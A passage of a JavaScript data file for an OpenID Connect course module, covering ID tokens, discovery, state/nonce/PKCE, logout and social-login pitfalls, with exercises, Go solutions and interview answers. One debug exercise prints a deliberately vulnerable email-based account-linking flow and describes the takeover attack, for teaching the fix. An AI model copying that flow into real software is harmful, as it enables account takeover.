        { q: 'What does Pushed Authorization Requests (PAR, RFC 9126) change about the authorization request?', a: 'The client sends the parameters to the AS over an authenticated back-channel POST and the browser carries only a short-lived request_uri, so the request cannot be tampered with or leaked via the URL and bad requests are rejected before user interaction.' }
      ],
      resources: [
        { title: 'OAuth 2.0 — oauth.net overview', url: 'https://oauth.net/2/', type: 'docs' },
        { title: 'OAuth 2.1 — oauth.net', url: 'https://oauth.net/2.1/', type: 'docs' },
        { title: 'RFC 9700 — Best Current Practice for OAuth 2.0 Security', url: 'https://datatracker.ietf.org/doc/html/rfc9700', type: 'docs' },
        { title: 'RFC 7636 — Proof Key for Code Exchange (PKCE)', url: 'https://datatracker.ietf.org/doc/html/rfc7636', type: 'docs' },
        { title: 'RFC 9396 — OAuth 2.0 Rich Authorization Requests', url: 'https://datatracker.ietf.org/doc/html/rfc9396', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 6 ─────────────────────────────────────────────
    {
      n: 6,
      title: 'OpenID Connect',
      summary: `OpenID Connect adds authentication to OAuth 2.0: the ID token, standard claims, discovery and JWKS, UserInfo, the roles of state, nonce and PKCE, recommended flows for SPAs, mobile and server apps, logout across applications (RP-initiated and back-channel), and the account-linking pitfalls of social login.`,
      topics: [
        {
          title: 'OIDC: The Identity Layer on Top of OAuth 2.0',
          def: `<p><strong>OpenID Connect Core 1.0</strong> turns OAuth into a login protocol. Requesting the <code>openid</code> scope makes the authorization server act as an <strong>OpenID Provider (OP)</strong> and the client a <strong>Relying Party (RP)</strong>. The OP returns an <strong>ID token</strong> — a signed JWT asserting who authenticated, when, how and for which client.</p>
<table>
<thead><tr><th></th><th>OAuth 2.0</th><th>OpenID Connect</th></tr></thead>
<tbody>
<tr><td>Purpose</td><td>delegated <em>authorization</em> to APIs</td><td><em>authentication</em> + basic profile</td></tr>
<tr><td>Main artifact</td><td>access token (for the API)</td><td>ID token (for the client) + access token for UserInfo</td></tr>
<tr><td>Audience</td><td>resource server</td><td>the client (<code>aud</code> = client_id)</td></tr>
<tr><td>Standardized</td><td>flows, token endpoint</td><td>claims, discovery, JWKS, UserInfo, logout, dynamic registration</td></tr>
</tbody>
</table>
<p>Standard scopes map to claim sets: <code>profile</code> (name, picture, locale...), <code>email</code> (<code>email</code>, <code>email_verified</code>), <code>address</code>, <code>phone</code>, plus <code>offline_access</code> to request a refresh token.</p>
<p>Flows: the <strong>authorization code flow (with PKCE)</strong> is the recommendation for all client types. The implicit flow (<code>response_type=id_token token</code>) and most hybrid variants are legacy. Useful request parameters: <code>prompt</code> (<code>login</code>, <code>consent</code>, <code>none</code>, <code>select_account</code>), <code>max_age</code> (force re-authentication age), <code>acr_values</code> (request MFA/assurance level), <code>login_hint</code>.</p>
<p>Related specs: Discovery, Dynamic Client Registration, RP-Initiated / Front-Channel / Back-Channel Logout, CIBA (decoupled auth), and FAPI 2.0 for high-security APIs.</p>`,
          interview: 'Summarize in one line: OAuth answers "may this client call the API?", OIDC answers "who is the user and how did they authenticate?". Know the openid scope, OP/RP terminology, standard scopes, and prompt/max_age/acr_values for step-up.',
          examples: [
            {
              label: 'OIDC authorization request (code flow + PKCE)',
              lang: 'http',
              code: `GET /authorize?response_type=code
  &client_id=s6BhdRkqt3
  &redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback
  &scope=openid%20profile%20email%20offline_access
  &state=af0ifjsldkj
  &nonce=n-0S6_WzA2Mj
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
  &max_age=3600
  &acr_values=urn:example:mfa HTTP/1.1
Host: login.example.com`
            }
          ]
        },
        {
          title: 'ID Token vs Access Token, Claims and Validation',
          def: `<table>
<thead><tr><th></th><th>ID token</th><th>Access token</th></tr></thead>
<tbody>
<tr><td>Consumer</td><td>the client (RP)</td><td>the resource server (API)</td></tr>
<tr><td>Format</td><td>always a JWT</td><td>JWT or opaque</td></tr>
<tr><td><code>aud</code></td><td>client_id</td><td>API identifier</td></tr>
<tr><td>Meaning</td><td>"this user authenticated at time T via method M"</td><td>"the bearer may perform these scopes"</td></tr>
<tr><td>Send to APIs?</td><td><strong>No</strong></td><td>yes</td></tr>
</tbody>
</table>
<p><strong>Key claims</strong>: <code>iss</code>, <code>sub</code> (stable, never reassigned — the user key is the pair <code>(iss, sub)</code>, <em>never the email</em>), <code>aud</code>, <code>azp</code> (authorized party when multiple audiences), <code>exp</code>, <code>iat</code>, <code>auth_time</code>, <code>nonce</code>, <code>acr</code> (assurance level), <code>amr</code> (methods: <code>pwd</code>, <code>otp</code>, <code>hwk</code>, <code>mfa</code>), <code>sid</code> (session id for logout), <code>at_hash</code>/<code>c_hash</code> (bind the access token / code in hybrid flows).</p>
<p><strong>ID token validation</strong> (OIDC Core §3.1.3.7):</p>
<ol>
<li>Verify the signature using the OP's JWKS and the expected <code>alg</code> (decrypt first if JWE).</li>
<li><code>iss</code> exactly equals the discovered issuer.</li>
<li><code>aud</code> contains your <code>client_id</code>; if multiple audiences, <code>azp</code> must be your client_id.</li>
<li><code>exp</code> in the future, <code>iat</code> reasonable.</li>
<li><code>nonce</code> equals the value stored for this login.</li>
<li>If you sent <code>max_age</code>, check <code>auth_time</code>; if you need MFA, check <code>acr</code>/<code>amr</code>.</li>
</ol>
<p>When the ID token arrives directly from the token endpoint over TLS, the code flow already gives strong guarantees, but validating everything (with a library) is still required practice.</p>`,
          interview: 'The classic question: "Can I send the ID token to my API?" — no, its audience is the client; APIs take access tokens. Also: the user identifier is iss+sub, not email. Recite the validation steps including nonce and azp.',
          examples: [
            {
              label: 'Decoded ID token',
              lang: 'json',
              code: `{
  "iss": "https://login.example.com",
  "sub": "248289761001",
  "aud": "s6BhdRkqt3",
  "exp": 1793278800,
  "iat": 1793275200,
  "auth_time": 1793275190,
  "nonce": "n-0S6_WzA2Mj",
  "acr": "urn:example:mfa",
  "amr": ["pwd", "hwk"],
  "sid": "08a5019c-17e1-4977-8f42-65a12843ea02",
  "email": "alice@example.com",
  "email_verified": true,
  "name": "Alice Example"
}`
            }
          ]
        },
        {
          title: 'Discovery, JWKS and the UserInfo Endpoint',
          def: `<p><strong>Discovery</strong> (OIDC Discovery 1.0): the RP fetches <code>{issuer}/.well-known/openid-configuration</code> to learn endpoints, supported algorithms, scopes and claims. Libraries (Go: <code>github.com/coreos/go-oidc/v3</code>) do this at startup and verify that the document's <code>issuer</code> equals the configured issuer — preventing a hijacked document from redirecting trust.</p>
<p>Important fields: <code>issuer</code>, <code>authorization_endpoint</code>, <code>token_endpoint</code>, <code>userinfo_endpoint</code>, <code>jwks_uri</code>, <code>end_session_endpoint</code>, <code>id_token_signing_alg_values_supported</code>, <code>code_challenge_methods_supported</code>, <code>backchannel_logout_supported</code>.</p>
<p><strong>JWKS</strong>: the OP's public signing keys. Cache them and refresh on an unknown <code>kid</code> (rate-limited). Rotation is transparent to well-behaved RPs.</p>
<p><strong>UserInfo</strong>: an OAuth-protected endpoint returning claims about the user (<code>GET /userinfo</code> with the access token). Use it when you need claims not in the ID token or fresher values. The <code>sub</code> in UserInfo <strong>must match</strong> the ID token's <code>sub</code> — otherwise reject (token substitution).</p>
<p><strong>Where to put claims</strong>: keep ID tokens small (core identity, auth context); fetch profile details from UserInfo; never rely on mutable claims (email, preferred_username, name) for authorization or account keys.</p>
<p>Multi-tenant OPs (e.g. Entra ID <code>/common</code> or <code>/organizations</code>) use issuer templates per tenant (<code>https://login.microsoftonline.com/{tid}/v2.0</code>); validate the issuer against the token's <code>tid</code> and your allowed-tenant list.</p>`,
          interview: 'Know what discovery returns and why issuer equality matters; that UserInfo needs the access token and its sub must match; and that mutable claims are not identifiers. Mention multi-tenant issuer validation as an advanced point.',
          examples: [
            {
              label: 'Discovery and UserInfo with curl',
              lang: 'bash',
              code: `ISSUER=https://accounts.google.com
curl -s $ISSUER/.well-known/openid-configuration | jq '{issuer, authorization_endpoint, token_endpoint,
  userinfo_endpoint, jwks_uri, id_token_signing_alg_values_supported, code_challenge_methods_supported}'

# Public signing keys
curl -s $(curl -s $ISSUER/.well-known/openid-configuration | jq -r .jwks_uri) | jq '.keys[] | {kid, alg, kty}'

# UserInfo (needs an access token obtained with scope=openid ...)
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" https://openidconnect.googleapis.com/v1/userinfo | jq .`
            }
          ]
        },
        {
          title: 'state, nonce and PKCE; Flows for SPA, Mobile and Server Apps',
          def: `<p>Three random values, three different jobs:</p>
<table>
<thead><tr><th>Parameter</th><th>Bound to</th><th>Checked by</th><th>Stops</th></tr></thead>
<tbody>
<tr><td><code>state</code></td><td>user's browser session</td><td>client, on the redirect</td><td>CSRF on the callback, login CSRF; can also carry return-URL reference</td></tr>
<tr><td><code>nonce</code></td><td>the authentication request</td><td>client, inside the signed ID token</td><td>ID token replay/injection (a token minted for another login)</td></tr>
<tr><td>PKCE verifier</td><td>the client instance</td><td>authorization server, at the token endpoint</td><td>authorization code interception and injection</td></tr>
</tbody>
</table>
<p><strong>Why use all three when you have PKCE?</strong> Their protections overlap only partly:</p>
<ul>
<li><strong>PKCE protects the authorization code</strong>: only the client instance holding the verifier can redeem it, which defeats code interception and code injection. RFC 9700 lets a client rely on PKCE for CSRF protection too — but only once it has made sure the AS actually <em>enforces</em> PKCE (rejects a token request without the verifier, refuses <code>plain</code>, advertises <code>code_challenge_methods_supported</code>).</li>
<li><strong>state</strong> is the client's own CSRF / session-binding check on the redirect: a one-time value bound to the browser session. Keep it whenever you cannot rely on PKCE enforcement (unknown or legacy AS, several ASes, a downgrade where the AS silently accepts requests without a challenge), and because it is also the natural handle to find this login attempt's stored data (verifier, nonce, return URL).</li>
<li><strong>nonce</strong> binds the ID token to this browser session's authentication request: it is echoed <em>inside the signed token</em>, so a token minted for any other login (replayed, injected, leaked) fails even with a valid signature. It is essential whenever an ID token travels through the front channel (hybrid/implicit) and cheap defense in depth in the code flow.</li>
</ul>
<p>All three are cheap random values; omitting one only saves a few lines, while each closes a different gap.</p>
<p><strong>Recommended architectures</strong>:</p>
<ul>
<li><strong>Server-rendered web app</strong>: confidential client, code + PKCE, <code>private_key_jwt</code>; validate ID token, then create your <em>own</em> session cookie. Tokens stay server-side.</li>
<li><strong>SPA</strong>: BFF pattern (preferred) — the BFF is the OIDC client; or a pure SPA public client with code + PKCE, tokens in memory, refresh token rotation/DPoP. No implicit flow.</li>
<li><strong>Mobile / desktop</strong>: public client, code + PKCE in the system browser (AppAuth libraries), claimed HTTPS redirects, refresh token in Keychain/Keystore.</li>
<li><strong>Input-constrained devices</strong>: device authorization grant with <code>openid</code> scope.</li>
</ul>
<p>After login the RP manages its own session lifetime; the IdP session is separate. Use <code>prompt=none</code> for silent checks only where third-party cookies allow; with browsers blocking them, prefer refresh tokens or BFF sessions.</p>`,
          interview: 'Very common follow-up: "If we have PKCE, why nonce and state?" Explain who checks each value and which attack it stops. Then give the recommended flow per client type, with the BFF for SPAs.',
          examples: [
            {
              label: 'Login state stored server-side per attempt',
              lang: 'json',
              code: `// key: login_attempt:{random id in a short-lived __Host-login cookie, SameSite=Lax, 10 min}
{
  "state": "af0ifjsldkj",
  "nonce": "n-0S6_WzA2Mj",
  "code_verifier": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
  "return_to": "/orders/42",          // validated relative path only (no open redirect)
  "created_at": "2026-10-29T12:00:00Z"
}`
            }
          ]
        },
        {
          title: 'Logout: RP-Initiated, Front-Channel and Back-Channel',
          def: `<p>With SSO there are several sessions: the RP's own session, the OP session, and sessions at other RPs. "Logout" must decide which to end.</p>
<p><strong>RP-Initiated Logout</strong> (user clicks logout in your app):</p>
<ol>
<li>RP deletes its local session (and revokes its refresh token, RFC 7009).</li>
<li>RP redirects the browser to the OP's <code>end_session_endpoint</code> with <code>id_token_hint</code> (or <code>client_id</code>), <code>post_logout_redirect_uri</code> (pre-registered, exact match) and <code>state</code>.</li>
<li>OP ends its session and notifies other RPs (front- or back-channel), then redirects back.</li>
</ol>
<p><strong>Back-Channel Logout</strong> (recommended): the OP POSTs a signed <strong>logout token</strong> (JWT) server-to-server to each RP's registered <code>backchannel_logout_uri</code>.</p>
<ol>
<li>RP validates signature, <code>iss</code>, <code>aud</code> (its client_id), <code>iat</code>/<code>exp</code>, <code>jti</code> (replay), that <code>events</code> contains <code>http://schemas.openid.net/event/backchannel-logout</code>, that <code>sub</code> and/or <code>sid</code> is present and <strong>no</strong> <code>nonce</code> is present.</li>
<li>RP deletes all local sessions matching <code>sid</code> (or <code>sub</code>), revokes stored tokens.</li>
<li>RP responds <code>200 OK</code> with <code>Cache-Control: no-store</code>.</li>
</ol>
<p>Requirement: the RP must index its sessions by OP <code>sid</code> and <code>sub</code>. Back-channel logout works without third-party cookies and reaches RPs even when the user's browser isn't on their pages.</p>
<p><strong>Front-Channel Logout</strong> renders hidden iframes to each RP's logout URL — increasingly unreliable because browsers block third-party cookies in iframes. <strong>Session Management</strong> (OP iframe polling) has the same problem.</p>
<p>Caveat: logout does not invalidate already-issued JWT access tokens at APIs — keep them short-lived or use revocation mechanisms.</p>`,
          interview: 'Explain the three session layers and walk through RP-initiated plus back-channel logout, including logout-token validation (events claim, no nonce, sid/sub, jti replay). Mention that front-channel breaks with third-party cookie blocking.',
          examples: [
            {
              label: 'Back-channel logout request and token payload',
              lang: 'http',
              code: `POST /oidc/backchannel-logout HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

logout_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjJjZmYiLCJ0eXAiOiJsb2dvdXQrand0In0...

# decoded payload
{
  "iss": "https://login.example.com",
  "aud": "s6BhdRkqt3",
  "iat": 1793279000,
  "exp": 1793279120,
  "jti": "bWJq",
  "sid": "08a5019c-17e1-4977-8f42-65a12843ea02",
  "events": { "http://schemas.openid.net/event/backchannel-logout": {} }
}

HTTP/1.1 200 OK
Cache-Control: no-store`
            }
          ]
        },
        {
          title: 'Social Login and Account Linking Pitfalls',
          def: `<p>"Sign in with Google / Apple / Microsoft" uses OIDC (GitHub and some others are plain OAuth 2.0 with a profile API — treat them carefully). Social login reduces password risk but adds identity-mapping risks:</p>
<ul>
<li><strong>Identify users by <code>(iss, sub)</code></strong>, never by email. Emails change, are recycled, and some providers let users set unverified or arbitrary emails. The 2023 "nOAuth" issue showed apps keyed on a mutable Entra ID <code>email</code> claim allowing account takeover.</li>
<li><strong>Automatic account linking by email</strong> is dangerous: an attacker creates a provider account with the victim's email (unverified, or a provider not authoritative for that domain) and gets merged into the victim's existing account. Link only when <code>email_verified</code> is true <em>and</em> the provider is authoritative, or better, require the user to sign in to the existing account first and confirm linking.</li>
<li><strong>Pre-account takeover</strong>: attacker registers with the victim's email + password before the victim ever signs up via social login; when the victim later uses "Sign in with Google", naive merging gives the attacker access. Require email verification before activating password accounts, and do not silently merge.</li>
<li><strong>Multi-tenant providers</strong>: for Entra ID <code>/common</code>, validate the <code>tid</code> and issuer; otherwise any Microsoft tenant can sign in.</li>
<li><strong>Apple</strong>: private relay emails and name only on first login; store it then.</li>
<li>Request minimal scopes; don't store provider access tokens unless needed; handle provider-side account deletion (Apple server-to-server notifications).</li>
</ul>`,
          interview: 'Interviewers probe account-linking takeovers: key on iss+sub, require verified email from an authoritative provider, require explicit linking from an authenticated session, and validate tenant for multi-tenant IdPs.',
          examples: [
            {
              label: 'Federated identity table',
              lang: 'text',
              code: `CREATE TABLE federated_identities (
  user_id     UUID NOT NULL REFERENCES users(id),
  issuer      TEXT NOT NULL,             -- e.g. https://accounts.google.com
  subject     TEXT NOT NULL,             -- stable 'sub' from that issuer
  email_at_link TEXT,                    -- informational only, never used for lookup
  linked_at   TIMESTAMPTZ NOT NULL DEFAULT now(),
  PRIMARY KEY (issuer, subject)
);
-- Login lookup: SELECT user_id FROM federated_identities WHERE issuer = $1 AND subject = $2;`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Inspect an OIDC provider discovery document',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>GET <code>{issuer}/.well-known/openid-configuration</code>.</li><li>Find: authorization, token, userinfo, jwks, end_session endpoints; supported algs; PKCE methods; backchannel logout support.</li><li>Confirm the <code>issuer</code> value is identical to the URL you configured.</li></ul>`,
          solution: `ISSUER=https://login.microsoftonline.com/common/v2.0
curl -s "$ISSUER/.well-known/openid-configuration" | jq '{
  issuer, authorization_endpoint, token_endpoint, userinfo_endpoint, jwks_uri, end_session_endpoint,
  algs: .id_token_signing_alg_values_supported, scopes: .scopes_supported,
  claims: .claims_supported, frontchannel_logout_supported }'

# Note: for Entra "common", issuer is a template "https://login.microsoftonline.com/{tenantid}/v2.0"
# -> the RP must substitute the token's tid and check it against an allow-list of tenants.`,
          lang: 'bash'
        },
        {
          t: 'Validate an ID token by hand against the spec checklist',
          d: 'easy',
          type: 'concept',
          hint: `<ul><li>Decode header and payload; check <code>alg</code> and <code>kid</code> against JWKS.</li><li>Walk the checklist: signature, iss, aud/azp, exp/iat, nonce, auth_time/acr.</li><li>Find what is wrong in the provided token.</li></ul>`,
          solution: `Expected: issuer https://login.example.com, client_id s6BhdRkqt3, stored nonce n-0S6_WzA2Mj, max_age=300 requested.

Token payload:
{"iss":"https://login.example.com/","sub":"248289761001","aud":["s6BhdRkqt3","analytics-app"],
 "exp":1793278800,"iat":1793275200,"auth_time":1793260000,"nonce":"n-0S6_WzA2Mj"}

Findings:
1. iss has a trailing slash -> not an exact match -> REJECT (issuer comparison is exact string).
2. aud has multiple values but no azp -> should require azp == s6BhdRkqt3 -> REJECT.
3. auth_time is 15200s before iat but max_age=300 was requested -> user did not re-authenticate -> REJECT/re-prompt.
4. nonce matches, exp in the future -> OK.
Signature: verify with JWKS key matching kid, alg pinned to RS256/ES256 per OP metadata.`,
          lang: 'text'
        },
        {
          t: 'Implement OIDC login in Go with go-oidc and x/oauth2',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li><code>oidc.NewProvider(ctx, issuer)</code> performs discovery; <code>provider.Verifier(&amp;oidc.Config{ClientID})</code>.</li><li>Auth URL with state, <code>oidc.Nonce(nonce)</code> and PKCE.</li><li>After <code>Exchange</code>, extract <code>id_token</code> from <code>tok.Extra</code>, <code>Verify</code>, compare nonce, map <code>(iss, sub)</code> to a local user, create a fresh session.</li></ul>`,
          solution: `type OIDC struct {
    conf     oauth2.Config
    verifier *oidc.IDTokenVerifier
}

func NewOIDC(ctx context.Context) (*OIDC, error) {
    p, err := oidc.NewProvider(ctx, "https://login.example.com") // discovery + issuer check
    if err != nil {
        return nil, err
    }
    return &OIDC{
        conf: oauth2.Config{
            ClientID:     "s6BhdRkqt3",
            ClientSecret: os.Getenv("OIDC_CLIENT_SECRET"),
            Endpoint:     p.Endpoint(),
            RedirectURL:  "https://app.example.com/callback",
            Scopes:       []string{oidc.ScopeOpenID, "profile", "email"},
        },
        verifier: p.Verifier(&oidc.Config{ClientID: "s6BhdRkqt3"}), // checks sig, iss, aud, exp
    }, nil
}

func (o *OIDC) Login(w http.ResponseWriter, r *http.Request) {
    a := LoginAttempt{State: rand.Text(), Nonce: rand.Text(), Verifier: oauth2.GenerateVerifier()}
    attempts.Save(w, r, a, 10*time.Minute)
    http.Redirect(w, r, o.conf.AuthCodeURL(a.State, oidc.Nonce(a.Nonce),
        oauth2.S256ChallengeOption(a.Verifier)), http.StatusFound)
}

func (o *OIDC) Callback(w http.ResponseWriter, r *http.Request) {
    ctx := r.Context()
    a, err := attempts.Take(w, r) // single use
    if err != nil || subtle.ConstantTimeCompare([]byte(r.URL.Query().Get("state")), []byte(a.State)) != 1 {
        http.Error(w, "invalid login state", http.StatusBadRequest)
        return
    }
    tok, err := o.conf.Exchange(ctx, r.URL.Query().Get("code"), oauth2.VerifierOption(a.Verifier))
    if err != nil {
        http.Error(w, "login failed", http.StatusBadGateway)
        return
    }
    raw, ok := tok.Extra("id_token").(string)
    if !ok {
        http.Error(w, "no id_token", http.StatusBadGateway)
        return
    }
    idt, err := o.verifier.Verify(ctx, raw)
    if err != nil || subtle.ConstantTimeCompare([]byte(idt.Nonce), []byte(a.Nonce)) != 1 {
        http.Error(w, "invalid id_token", http.StatusUnauthorized)
        return
    }
    var c struct {
        Email         string \`json:"email"\`
        EmailVerified bool   \`json:"email_verified"\`
        Name          string \`json:"name"\`
        SID           string \`json:"sid"\`
    }
    if err := idt.Claims(&c); err != nil {
        http.Error(w, "bad claims", http.StatusUnauthorized)
        return
    }
    user, err := users.FindOrProvision(ctx, idt.Issuer, idt.Subject, c.Email, c.EmailVerified, c.Name) // key = iss+sub
    if err != nil {
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
    sessions.Create(ctx, w, user.ID, Session{OPSid: c.SID, Refresh: tok.RefreshToken}) // new session id, index by sid
    http.Redirect(w, r, safeReturnTo(a.ReturnTo), http.StatusSeeOther)
}`,
          lang: 'go'
        },
        {
          t: 'Explain which attack each of state, nonce and PKCE prevents',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>Who generates, who checks, and where the value travels.</li><li>State: callback CSRF. Nonce: ID token replay/injection. PKCE: code interception/injection.</li><li>Give an attack scenario for each when missing.</li></ul>`,
          solution: `state (checked by client against the browser session)
  Missing -> attacker logs in with HIS account, captures the callback URL (code+state) and makes the victim's
  browser load it -> victim is silently logged into attacker's account (login CSRF); victim then saves card data
  into attacker's account.

nonce (sent in auth request, echoed inside the signed ID token, checked by client)
  Missing -> an ID token obtained in another context (e.g. leaked from logs or another login) can be injected and
  accepted as fresh authentication for this session. Critical for implicit/hybrid flows; defense-in-depth with code flow.

PKCE (verifier kept by client, checked by AS at the token endpoint)
  Missing -> a malicious app registered for the same custom URL scheme (or a leaked code via Referer/logs) redeems
  the code for tokens; or attacker injects a stolen code into his own session at a confidential client.

Use all three: state + nonce are cheap, PKCE is mandatory in OAuth 2.1.`,
          lang: 'text'
        },
        {
          t: 'Debug "invalid issuer" and "audience mismatch" ID token errors',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Compare the configured issuer with the token's <code>iss</code> byte for byte (trailing slash, v1 vs v2 endpoints, tenant id vs "common").</li><li>Audience: is the token for your client_id or is it an access token for an API?</li><li>Clock skew causing <code>iat</code>/<code>exp</code> errors in containers.</li></ul>`,
          solution: `Symptom 1: oidc: id token issued by a different provider, expected "https://login.microsoftonline.com/common/v2.0"
  got "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/v2.0"
  Cause: multi-tenant endpoint; issuer contains the tenant id.
  Fix: configure the tenant-specific issuer, or for multi-tenant apps use a custom verifier that validates
       iss == "https://login.microsoftonline.com/" + tid + "/v2.0" and tid in allowedTenants.

Symptom 2: oidc: expected audience "s6BhdRkqt3" got ["api://orders"]
  Cause: code passes the ACCESS token (aud=API) to the ID token verifier.
  Fix: verify tok.Extra("id_token"), not tok.AccessToken.

Symptom 3: token used before issued / expired intermittently
  Cause: node clock drift. Fix: chrony/NTP on nodes; allow <= 60s leeway.

Symptom 4: failed to verify signature: fetching keys ... no such host
  Cause: egress policy blocks JWKS URL. Fix: allow egress to the OP, cache JWKS.`,
          lang: 'text'
        },
        {
          t: 'Implement an OIDC back-channel logout endpoint in Go',
          d: 'hard',
          type: 'coding',
          hint: `<ul><li>Parse <code>logout_token</code> from the form body (limit size).</li><li>Verify with the same JWKS/issuer/audience; check <code>events</code> member, <code>sid</code> or <code>sub</code>, no <code>nonce</code>, <code>jti</code> not seen before.</li><li>Delete sessions by sid/sub, revoke refresh tokens, return 200 with <code>Cache-Control: no-store</code>; 400 on invalid tokens.</li></ul>`,
          solution: `const bclEvent = "http://schemas.openid.net/event/backchannel-logout"

func (o *OIDC) BackchannelLogout(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Cache-Control", "no-store")
    r.Body = http.MaxBytesReader(w, r.Body, 16<<10)
    if err := r.ParseForm(); err != nil {
        http.Error(w, "bad request", http.StatusBadRequest)
        return
    }
    raw := r.PostForm.Get("logout_token")
    t, err := o.verifier.Verify(r.Context(), raw) // signature, iss, aud, exp
    if err != nil {
        http.Error(w, "invalid logout token", http.StatusBadRequest)
        return
    }
    var c struct {
        Sub    string                     \`json:"sub"\`
        Sid    string                     \`json:"sid"\`
        Jti    string                     \`json:"jti"\`
        Nonce  *string                    \`json:"nonce"\`
        Events map[string]json.RawMessage \`json:"events"\`
    }
    if err := t.Claims(&c); err != nil {
        http.Error(w, "invalid claims", http.StatusBadRequest)
        return
    }
    if _, ok := c.Events[bclEvent]; !ok || c.Nonce != nil || (c.Sub == "" && c.Sid == "") || c.Jti == "" {
        http.Error(w, "invalid logout token", http.StatusBadRequest)
        return
    }
    if !replayCache.AddIfAbsent(c.Jti, 10*time.Minute) {
        http.Error(w, "replayed", http.StatusBadRequest)
        return
    }
    var n int
    if c.Sid != "" {
        n, err = sessions.DeleteByOPSid(r.Context(), t.Issuer, c.Sid) // also revokes stored refresh tokens
    } else {
        n, err = sessions.DeleteBySubject(r.Context(), t.Issuer, c.Sub)
    }
    if err != nil {
        http.Error(w, "logout failed", http.StatusInternalServerError) // OP may retry
        return
    }
    slog.InfoContext(r.Context(), "backchannel logout", "sid", c.Sid, "sessions", n)
    w.WriteHeader(http.StatusOK)
}`,
          lang: 'go'
        },
        {
          t: 'Fix an account takeover via email-based account linking',
          d: 'hard',
          type: 'debug',
          hint: `<ul><li>Current code: on social login, <code>SELECT user WHERE email = claims.email</code> and log in.</li><li>Attack: create a provider account (or tenant) with the victim's email, unverified or not authoritative.</li><li>Fix: key on (iss, sub); explicit, authenticated linking; trust email only when verified by an authoritative provider.</li></ul>`,
          solution: `Vulnerable flow:
  claims := verify(idToken)
  user := db.UserByEmail(claims.Email)      // <- attacker-controlled when email is unverified or mutable
  if user == nil { user = db.Create(claims.Email) }
  login(user)

Attack: attacker sets victim@corp.com as email in an IdP that doesn't verify it (or in his own Entra tenant,
the "nOAuth" pattern) and signs in -> lands in the victim's account.

Fix:
  1. Lookup by federated identity: SELECT user_id FROM federated_identities WHERE issuer=$iss AND subject=$sub.
  2. Not found ->
       a. If a local account with that email exists: do NOT auto-link. Ask the user to sign in to the existing account
          (password+MFA or existing provider) and then confirm "link Google account" -> insert (iss, sub).
       b. Else create a new account; store email only if email_verified == true from an authoritative issuer
          (e.g. Google for gmail.com / Google Workspace verified domains).
  3. Never use email, preferred_username or upn as an authorization key.
  4. For multi-tenant IdPs, restrict accepted tenants (tid) per customer.
  5. Add tests: unverified email, different issuer same email, same email different tenant -> no access.`,
          lang: 'text'
        },
        {
          t: 'Design login for a SPA, mobile apps and an admin portal using one IdP',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>One OP, separate client registrations per app (different redirect URIs, grants, token lifetimes).</li><li>SPA via BFF; mobile via AppAuth + PKCE; admin portal requires phishing-resistant MFA (<code>acr_values</code>) and shorter sessions.</li><li>APIs accept access tokens with their own audience; plan logout and session lifetimes.</li></ul>`,
          solution: `Clients at the OP:
  web-bff       confidential, code+PKCE, private_key_jwt, redirect https://app.example.com/bff/callback,
                refresh rotation, backchannel_logout_uri https://app.example.com/bff/backchannel-logout
  mobile-ios/android public, code+PKCE, claimed HTTPS redirects, DPoP-bound refresh tokens (30 days idle)
  admin-portal  confidential, code+PKCE, acr_values=phishing-resistant (passkey/FIDO2), max_age=28800,
                group claim restricted to admins, IP/device posture via IdP conditional access
APIs:
  orders-api (aud https://orders.api) <- access tokens from web-bff & mobile, scopes orders:*
  admin-api  (aud https://admin.api)  <- only admin-portal tokens with acr = phishing-resistant
Sessions:
  BFF session 8h absolute / 30 min idle; admin portal 8h absolute / 15 min idle, step-up for destructive ops (max_age=300)
Logout:
  RP-initiated logout to end_session_endpoint; OP fans out back-channel logout to all registered RPs;
  mobile refresh tokens revoked via OP session termination.
Identity: users keyed by (iss, sub); roles from IdP groups mapped in the app (SCIM for lifecycle).`,
          lang: 'text'
        },
        {
          t: 'Allow customers to sign in with their own corporate IdP (multi-tenant OIDC)',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Per-tenant IdP configuration: issuer, client_id/secret or key, allowed email domains.</li><li>Home-realm discovery: decide which IdP from the email domain or tenant subdomain.</li><li>Strict issuer per tenant; never accept a token from tenant A's IdP for tenant B.</li><li>JIT provisioning vs SCIM; mapping IdP groups to app roles.</li></ul>`,
          solution: `Data model: tenant_idp(tenant_id, issuer, client_id, client_auth, allowed_domains[], group_role_map, enabled)
Flow:
 1. User enters email or visits acme.app.example.com -> home-realm discovery picks tenant "acme".
 2. Redirect to acme's OP with state/nonce/PKCE; login attempt records tenant_id.
 3. Callback: verifier built for THAT tenant's issuer + client_id (cache per tenant).
 4. Check: token.iss == tenant.issuer (exact), aud == tenant client_id, email domain in allowed_domains
    (defense in depth), user key = (tenant_id, iss, sub).
 5. JIT-provision or match a SCIM-provisioned user; map groups -> roles via tenant config; deny if no role.
 6. Session carries tenant_id; every API query is scoped by tenant_id (row-level security).
Pitfalls avoided: shared "common" issuer accepting any tenant, email-based cross-tenant matching,
one global verifier for all tenants, trusting group names without tenant scoping.
Ops: per-tenant IdP health metrics, certificate/JWKS rollover monitoring, self-service config with validation.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'What is the difference between an ID token and an access token?',
          a: `<ul>
<li><strong>ID token</strong> (OIDC): always a signed JWT, audience = the <em>client</em>. It tells the client who authenticated (<code>iss</code>+<code>sub</code>), when (<code>auth_time</code>), how (<code>acr</code>, <code>amr</code>) and binds to the request (<code>nonce</code>). The client validates it once to create its own session.</li>
<li><strong>Access token</strong> (OAuth): audience = the <em>API</em>. It authorizes calls with specific scopes. It may be opaque to the client; the client should not parse it or rely on its format.</li>
</ul>
